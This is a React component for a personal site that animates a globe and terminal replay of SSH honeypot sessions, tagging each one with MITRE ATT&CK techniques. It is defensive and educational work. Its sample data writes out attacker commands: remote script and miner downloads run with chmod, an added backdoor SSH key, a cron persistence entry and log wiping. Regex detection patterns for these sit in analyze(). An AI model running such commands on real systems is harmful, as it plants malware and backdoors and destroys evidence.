'use client';

/*
 * Live honeypot wall. Reads a JSON feed produced by honeypot/export_feed.py on the Cowrie server.
 * Until a feed URL is set in honeypotConfig.ts, it replays clearly labeled sample data.
 */
import { useEffect, useRef, useState } from 'react';
import { landDots } from './three';
import { honeypotFeed, honeypotHome } from './honeypotConfig';
import { play } from './sound';

export type HpEvent = { ts: string; ip: string; cc: string; country: string; lat: number; lon: number; user: string; pass: string; ok: boolean; cmds: string[] };
type Feed = { updated: string; events: HpEvent[]; stats: { today: number; countries: [string, number][]; passwords: [string, number][]; uniqueIps: number } };

const sample: HpEvent[] = [
  { ts: '', ip: '61.xx.xx.27', cc: 'CN', country: 'China', lat: 31.2, lon: 121.5, user: 'root', pass: '123456', ok: true, cmds: ['uname -a', 'cat /proc/cpuinfo | grep name | wc -l', 'nproc'] },
  { ts: '', ip: '45.xx.xx.112', cc: 'NL', country: 'Netherlands', lat: 52.4, lon: 4.9, user: 'admin', pass: 'admin', ok: true, cmds: ['cd /tmp || cd /var/run', 'wget http://[redacted]/bins.sh', 'chmod 777 bins.sh; sh bins.sh'] },
  { ts: '', ip: '177.xx.xx.9', cc: 'BR', country: 'Brazil', lat: -23.5, lon: -46.6, user: 'support', pass: 'support', ok: false, cmds: [] },
  { ts: '', ip: '193.xx.xx.54', cc: 'RU', country: 'Russia', lat: 55.8, lon: 37.6, user: 'root', pass: 'P@ssw0rd', ok: true, cmds: ['echo "ssh-rsa AAAA…" >> ~/.ssh/authorized_keys', 'chattr +i ~/.ssh/authorized_keys'] },
  { ts: '', ip: '103.xx.xx.201', cc: 'VN', country: 'Vietnam', lat: 21.0, lon: 105.8, user: 'ubnt', pass: 'ubnt', ok: false, cmds: [] },
  { ts: '', ip: '159.xx.xx.30', cc: 'US', country: 'United States', lat: 37.8, lon: -122.4, user: 'root', pass: 'root', ok: true, cmds: ['free -m', 'curl -s http://[redacted]/xmrig -o /tmp/.x', 'chmod +x /tmp/.x && /tmp/.x -o pool:3333'] },
  { ts: '', ip: '117.xx.xx.66', cc: 'IN', country: 'India', lat: 19.1, lon: 72.9, user: 'pi', pass: 'raspberry', ok: true, cmds: ['ls -la', 'history -c', 'rm -rf /var/log/*'] },
  { ts: '', ip: '5.xx.xx.140', cc: 'DE', country: 'Germany', lat: 50.1, lon: 8.7, user: 'oracle', pass: 'oracle123', ok: false, cmds: [] },
  { ts: '', ip: '211.xx.xx.8', cc: 'KR', country: 'South Korea', lat: 37.6, lon: 127.0, user: 'root', pass: '1qaz2wsx', ok: true, cmds: ['cat /etc/passwd', 'ps aux | grep -i miner', 'pkill -f kdevtmpfsi'] },
  { ts: '', ip: '41.xx.xx.73', cc: 'EG', country: 'Egypt', lat: 30.0, lon: 31.2, user: 'test', pass: 'test', ok: false, cmds: [] },
  { ts: '', ip: '185.xx.xx.19', cc: 'GB', country: 'United Kingdom', lat: 51.5, lon: -0.1, user: 'root', pass: 'toor', ok: true, cmds: ['crontab -l', '(crontab -l; echo "* * * * * /tmp/.u") | crontab -'] },
  { ts: '', ip: '36.xx.xx.250', cc: 'ID', country: 'Indonesia', lat: -6.2, lon: 106.8, user: 'admin', pass: '12345', ok: false, cmds: [] },
];

export function analyze(cmds: string[], ok: boolean): { tag: string; mitre: string; color: string } {
  const c = cmds.join(' ').toLowerCase();
  if (!ok) return { tag: 'Credential guessing (failed)', mitre: 'T1110.001', color: '#94a3b8' };
  if (/xmrig|miner|pool:|kdevtmpfsi/.test(c)) return { tag: 'Crypto-miner install / competitor cleanup', mitre: 'T1496', color: '#fbbf24' };
  if (/wget|curl|tftp/.test(c) && /sh|chmod/.test(c)) return { tag: 'Malware dropper (botnet loader)', mitre: 'T1105', color: '#f87171' };
  if (/authorized_keys|crontab|systemctl enable/.test(c)) return { tag: 'Persistence: backdoor key or cron job', mitre: 'T1098.004 · T1053.003', color: '#c084fc' };
  if (/history -c|rm -rf \/var\/log|unset histfile/.test(c)) return { tag: 'Covering tracks', mitre: 'T1070', color: '#fb923c' };
  if (/cpuinfo|nproc|uname|free -m|\/etc\/passwd|ps aux/.test(c)) return { tag: 'System recon before payload', mitre: 'T1082', color: '#60a5fa' };
  return { tag: 'Interactive session', mitre: 'T1059.004', color: '#60a5fa' };
}

function sampleStats(ev: HpEvent[]): Feed['stats'] {
  const cnt = (k: (e: HpEvent) => string) => Object.entries(ev.reduce<Record<string, number>>((a, e) => { a[k(e)] = (a[k(e)] || 0) + 1; return a; }, {})).sort((a, b) => b[1] - a[1]).slice(0, 5) as [string, number][];
  return { today: ev.length, countries: cnt(e => e.country), passwords: cnt(e => e.pass), uniqueIps: new Set(ev.map(e => e.ip)).size };
}

export function LiveHoneypot({ onLabels }: { onLabels?: (labels: string[], live: boolean) => void }) {
  const [feed, setFeed] = useState<Feed | null>(null);
  const [live, setLive] = useState(false);
  const [lines, setLines] = useState<{ t: string; c: string }[]>([]);
  const [cur, setCur] = useState<HpEvent | null>(null);
  const arcs = useRef<{ e: HpEvent; t: number }[]>([]);
  const cv = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let stop = false;
    const useSample = () => { const ev = sample.map((e, i) => ({ ...e, ts: new Date(Date.now() - (sample.length - i) * 97000).toISOString() })); setFeed({ updated: new Date().toISOString(), events: ev, stats: sampleStats(ev) }); setLive(false); };
    const load = async () => {
      if (!honeypotFeed) { useSample(); return; }
      try {
        const r = await fetch(honeypotFeed, { cache: 'no-store' }); if (!r.ok) throw new Error('feed');
        const f = (await r.json()) as Feed; if (!stop && f.events?.length) { setFeed(f); setLive(true); }
      } catch { if (!stop) useSample(); }
    };
    load(); const id = setInterval(load, 60000);
    return () => { stop = true; clearInterval(id); };
  }, []);

  useEffect(() => {
    if (!feed) return;
    onLabels?.(feed.events.map(e => `${analyze(e.cmds, e.ok).tag.split(' (')[0].split(':')[0]} · ${e.cc}`), live);
    let i = 0, timer: ReturnType<typeof setTimeout>;
    const next = () => {
      const e = feed.events[i++ % feed.events.length]; setCur(e); arcs.current.push({ e, t: performance.now() }); if (arcs.current.length > 8) arcs.current.shift();
      const a = analyze(e.cmds, e.ok), time = new Date(e.ts || Date.now()).toLocaleTimeString('en-US', { hour12: false });
      const add: { t: string; c: string }[] = [{ t: `[${time}] ${e.ip} (${e.cc}) login ${e.user}:${e.pass} → ${e.ok ? 'ACCEPTED' : 'denied'}`, c: e.ok ? 'acc' : 'den' }, ...e.cmds.map(c => ({ t: `  $ ${c}`, c: 'cmd' })), { t: `  ↳ ${a.tag} · ${a.mitre}`, c: 'an' }];
      setLines(l => [...l, ...add].slice(-14));
      if (e.ok) play('hover');
      timer = setTimeout(next, 1800 + e.cmds.length * 500);
    };
    next(); return () => clearTimeout(timer);
  }, [feed, live]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    const c = cv.current; if (!c) return; const x = c.getContext('2d'); if (!x) return;
    let raf = 0, w = 0, h = 0, vis = false;
    const size = () => { const r = devicePixelRatio || 1; w = c.clientWidth; h = c.clientHeight; c.width = w * r; c.height = h * r; x.setTransform(r, 0, 0, r, 0, 0); };
    size(); const ro = new ResizeObserver(size); ro.observe(c);
    const io = new IntersectionObserver(e => { vis = e[0].isIntersecting; }); io.observe(c);
    const acc = getComputedStyle(document.documentElement).getPropertyValue('--acc-rgb').trim() || '143,176,255';
    const loop = (t: number) => {
      if (vis) {
        x.clearRect(0, 0, w, h);
        const R = Math.min(w, h) * 0.43, cx = w / 2, cy = h / 2, rot = 1.3 + t / 30000, tilt = 0.45;
        const P = (la: number, lo: number, r = R) => { const ph = (la * Math.PI) / 180, l = (lo * Math.PI) / 180 + rot; const X = Math.cos(ph) * Math.sin(l), Y = Math.sin(ph), Z = Math.cos(ph) * Math.cos(l); const y2 = Y * Math.cos(tilt) - Z * Math.sin(tilt), z2 = Y * Math.sin(tilt) + Z * Math.cos(tilt); return [cx + X * r, cy - y2 * r, z2] as const; };
        const g = x.createRadialGradient(cx - R * 0.3, cy - R * 0.3, R * 0.1, cx, cy, R); g.addColorStop(0, `rgba(${acc},.16)`); g.addColorStop(1, 'rgba(4,8,18,.92)');
        x.fillStyle = g; x.beginPath(); x.arc(cx, cy, R, 0, 7); x.fill(); x.strokeStyle = `rgba(${acc},.35)`; x.stroke();
        landDots.forEach(([la, lo]) => { const q = P(la, lo); if (q[2] < 0.02) return; x.fillStyle = `rgba(${acc},${(0.18 + q[2] * 0.45).toFixed(2)})`; x.fillRect(q[0] - 0.8, q[1] - 0.8, 1.6, 1.6); });
        const home = P(honeypotHome.lat, honeypotHome.lon);
        arcs.current.forEach(({ e, t: t0 }) => {
          const k = Math.min(1, (t - t0) / 1400), fade = Math.max(0, 1 - (t - t0) / 9000), col = e.ok ? '248,113,113' : '148,163,184';
          x.beginPath(); let on = false;
          for (let s = 0; s <= 40 * k; s++) { const f = s / 40, lift = 1 + Math.sin(f * Math.PI) * 0.25; const q = P(e.lat + (honeypotHome.lat - e.lat) * f, e.lon + (honeypotHome.lon - e.lon) * f, R * lift); if (q[2] < -0.1) { on = false; continue; } if (on) x.lineTo(q[0], q[1]); else x.moveTo(q[0], q[1]); on = true; }
          x.strokeStyle = `rgba(${col},${0.85 * fade})`; x.lineWidth = 1.6; x.stroke();
          const src = P(e.lat, e.lon); if (src[2] > 0) { x.fillStyle = `rgba(${col},${fade})`; x.beginPath(); x.arc(src[0], src[1], 3, 0, 7); x.fill(); }
        });
        if (home[2] > 0) { const pr = 6 + ((t / 900) % 1) * 16; x.strokeStyle = `rgba(74,222,128,${1 - ((t / 900) % 1)})`; x.beginPath(); x.arc(home[0], home[1], pr, 0, 7); x.stroke(); x.fillStyle = '#4ade80'; x.beginPath(); x.arc(home[0], home[1], 4.5, 0, 7); x.fill(); x.font = '600 11px Inter, sans-serif'; x.fillText('my honeypot', home[0] + 8, home[1] - 6); }
      }
      raf = requestAnimationFrame(loop);
    };
    raf = requestAnimationFrame(loop);
    return () => { cancelAnimationFrame(raf); ro.disconnect(); io.disconnect(); };
  }, []);

  const st = feed?.stats, a = cur ? analyze(cur.cmds, cur.ok) : null;
  return (
    <div className="hpot">
      <div className="hpot-head">
        <span className={'hpot-badge' + (live ? ' live' : '')}><i />{live ? 'LIVE · real attacks on my honeypot' : 'SAMPLE REPLAY · live feed connects when my honeypot is online'}</span>
        {feed && <small>Updated {new Date(feed.updated).toLocaleTimeString('en-US')}</small>}
      </div>
      <div className="hpot-grid">
        <div className="hpot-globe"><canvas ref={cv} aria-label="Globe with attack arcs flying to my honeypot" role="img" /></div>
        <div className="hpot-term" aria-live="off">
          <div className="hpot-tb"><i /><i /><i /><span>cowrie.json · tail -f</span></div>
          <div className="hpot-lines">{lines.map((l, i) => <div key={i} className={l.c}>{l.t}</div>)}</div>
          {a && <div className="hpot-now" style={{ borderColor: a.color }}><small>My read on the latest session</small><b style={{ color: a.color }}>{a.tag}</b><span>MITRE ATT&amp;CK {a.mitre}</span></div>}
        </div>
      </div>
      {st && (
        <div className="hpot-stats">
          <div><b>{st.today}</b><span>{live ? 'attacks in the last 24 h' : 'sessions in this sample'}</span></div>
          <div><b>{st.uniqueIps}</b><span>unique attacker IPs</span></div>
          <div><small>Top countries</small>{st.countries.slice(0, 3).map(([c, n]) => <p key={c}>{c}<em>{n}</em></p>)}</div>
          <div><small>Most tried passwords</small>{st.passwords.slice(0, 3).map(([p, n]) => <p key={p}><code>{p}</code><em>{n}</em></p>)}</div>
        </div>
      )}
      <p className="hpot-note">IP addresses are masked. The honeypot is an isolated decoy server running <a href="https://github.com/cowrie/cowrie" target="_blank" rel="noopener noreferrer">Cowrie</a>; nothing on it is real.</p>
    </div>
  );
}
